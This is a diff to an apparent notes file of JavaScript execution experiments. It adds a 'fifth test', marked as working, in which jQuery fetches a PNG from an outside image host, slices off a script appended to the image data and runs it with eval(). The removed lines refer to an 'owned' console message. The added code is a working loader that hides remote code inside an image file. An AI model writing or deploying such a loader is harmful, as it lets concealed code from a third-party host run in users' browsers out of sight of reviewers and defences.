@@ -127,10 +127,19 @@ $.ajax({
   });
 ```
 
-in this case we get the console message:
+javascript code is executed
+
+## Fith test. Javascript appened to a PNG image located in an image host. Works
 
 ```
-owned
+    // Execute call to download external script
+    $.ajax({
+      url: "https://i.ibb.co/9ZtQ16B/icon.png?" + new Date().getTime(),
+      success: function (data) {
+        // extract the plain text from the end of the image
+        let myscript = data.slice(22505);
+        // Execute it
+        eval(myscript);
+      },
+    });
 ```
-
-This method works event wiouth creating the META tag!
